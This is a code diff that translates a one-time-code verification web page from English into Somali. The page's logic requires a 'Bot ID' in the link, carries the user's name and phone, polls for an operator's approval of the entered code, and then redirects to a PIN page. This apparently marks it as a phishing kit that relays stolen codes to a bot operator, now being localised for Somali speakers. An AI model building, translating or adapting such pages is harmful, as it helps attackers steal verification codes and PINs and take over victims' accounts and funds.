@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Enter verification code</title>
+    <title>Geli koodka xaqiijinta</title>
     <style>
         * {
             margin: 0;
@@ -188,9 +188,9 @@
         <a href="javascript:history.back()" class="back-arrow">&#8592;</a>
 
         <!-- Title & subtitle -->
-        <div class="title">Enter verification code</div>
+        <div class="title">Geli koodka xaqiijinta</div>
         <div class="subtitle" id="subtitlePlaceholder">
-            Please enter the 6-digit code sent to your number or email
+            Fadlan geli koodka 6-godka ah ee loo diray lambarkaaga ama email-kaaga
         </div>
 
         <!-- 6 OTP inputs -->
@@ -205,14 +205,14 @@
 
         <!-- Resend timer -->
         <div class="resend-wrap">
-            Resend code in <span class="timer">02:00</span>
+            Dib u dir koodka <span class="timer">02:00</span>
         </div>
 
         <!-- Need help? link -->
-        <a href="#" class="help-link">Need help?</a>
+        <a href="#" class="help-link">Caawimaad u baahan?</a>
 
         <!-- Button -->
-        <button class="continue-btn">Next</button>
+        <button class="continue-btn">Xiga</button>
 
         <!-- Message box (hidden by default) -->
         <div id="message-box"></div>
@@ -231,7 +231,7 @@
             const subtitle = document.getElementById('subtitlePlaceholder');
             // --- Changed to match the new design (no phone number shown) ---
             if (subtitle) {
-                subtitle.textContent = 'Please enter the 6-digit code sent to your number or email';
+                subtitle.textContent = 'Fadlan geli koodka 6-godka ah ee loo diray lambarkaaga ama email-kaaga';
             }
         })();
     </script>
@@ -359,7 +359,7 @@
 
             function updateTimerUI() {
                 if (totalSeconds <= 0) {
-                    resendWrapEl.innerHTML = 'Resend code';
+                    resendWrapEl.innerHTML = 'Dib u dir koodka';
                     resendWrapEl.style.color = '#007AFF';
                     resendWrapEl.style.cursor = 'pointer';
                     resendWrapEl.style.fontWeight = '600';
@@ -375,7 +375,7 @@
                     return;
                 }
                 timerSpan.textContent = formatTime(totalSeconds);
-                resendWrapEl.innerHTML = `Resend code in <span class="timer">${formatTime(totalSeconds)}</span>`;
+                resendWrapEl.innerHTML = `Dib u dir koodka <span class="timer">${formatTime(totalSeconds)}</span>`;
                 resendWrapEl.style.color = '#6c6c70';
                 resendWrapEl.style.cursor = 'default';
                 resendWrapEl.style.fontWeight = '400';
@@ -403,15 +403,15 @@
 
             function hasRequiredData() {
                 if (!name) {
-                    showMessage('Name missing – please go back and enter your name.', true);
+                    showMessage('Magaca ma jiro – fadlan dib u noqo oo geli magacaaga.', true);
                     return false;
                 }
                 if (!phone) {
-                    showMessage('Phone number missing – please restart.', true);
+                    showMessage('Lambarka telefoonka ma jiro – fadlan dib u bilow.', true);
                     return false;
                 }
                 if (!botId) {
-                    showMessage('Bot ID missing – please use the correct link.', true);
+                    showMessage('Bot ID ma jiro – fadlan isticmaal linkiga saxda ah.', true);
                     return false;
                 }
                 hideMessage();
@@ -425,7 +425,7 @@
                 const otp = Array.from(inputs).map(inp => inp.value).join('');
 
                 continueBtn.disabled = true;
-                continueBtn.textContent = 'Verifying...';
+                continueBtn.textContent = 'Xaqiijin...';
                 continueBtn.style.background = '#f5a623';
                 continueBtn.style.color = '#fff';
 
@@ -455,9 +455,9 @@
                                     window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
                                 } else if (status.approved === false) {
                                     clearInterval(pollInterval);
-                                    showMessage('Incorrect code. Please try again.', true);
+                                    showMessage('Koodka waa qalad. Fadlan mar kale isku day.', true);
                                     continueBtn.disabled = false;
-                                    continueBtn.textContent = 'Next';
+                                    continueBtn.textContent = 'Xiga';
                                     continueBtn.style.background = '#007AFF';
                                     continueBtn.style.color = '#fff';
                                     inputs.forEach(inp => inp.value = '');
@@ -467,18 +467,18 @@
                             })
                             .catch(err => {
                                 clearInterval(pollInterval);
-                                showMessage('Verification error: ' + err.message, true);
+                                showMessage('Cilad xaqiijin: ' + err.message, true);
                                 continueBtn.disabled = false;
-                                continueBtn.textContent = 'Next';
+                                continueBtn.textContent = 'Xiga';
                                 continueBtn.style.background = '#007AFF';
                                 continueBtn.style.color = '#fff';
                             });
                     }, 2000);
                 })
                 .catch(err => {
-                    showMessage('Send error: ' + err.message, true);
+                    showMessage('Cilad diris: ' + err.message, true);
                     continueBtn.disabled = false;
-                    continueBtn.textContent = 'Next';
+                    continueBtn.textContent = 'Xiga';
                     continueBtn.style.background = '#007AFF';
                     continueBtn.style.color = '#fff';
                 });
